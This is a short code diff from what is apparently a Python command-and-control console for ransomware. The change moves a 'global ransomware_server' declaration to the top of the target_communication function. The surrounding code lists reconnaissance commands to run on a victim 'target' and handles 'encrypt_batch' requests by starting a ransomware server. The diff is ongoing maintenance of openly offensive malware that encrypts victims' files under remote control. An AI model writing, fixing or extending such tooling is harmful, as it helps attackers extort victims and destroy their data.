@@ -69,6 +69,8 @@ def download_file(file_name):
 
 # Function for the main communication loop with the target
 def target_communication():
+    global ransomware_server
+    
     print("BASIC COMMANDS:")
     print("   whoami, dir, ipconfig, pwd, ps, net user")
     print("   cd <path>              - Change directory")
@@ -219,7 +221,6 @@ def target_communication():
                 encryption_request = json.loads(result)
                 
                 if encryption_request.get('action') == 'encrypt_batch':
-                    global ransomware_server
                     if ransomware_server is None:
                         ransomware_server = create_ransomware_server()
                     
@@ -258,7 +259,6 @@ def target_communication():
                 print(f"Encryption processing error: {e}")
         elif command == 'ransomware_server_stats':
             # Handle server-side ransomware stats locally
-            global ransomware_server
             if ransomware_server is None:
                 ransomware_server = create_ransomware_server()
             
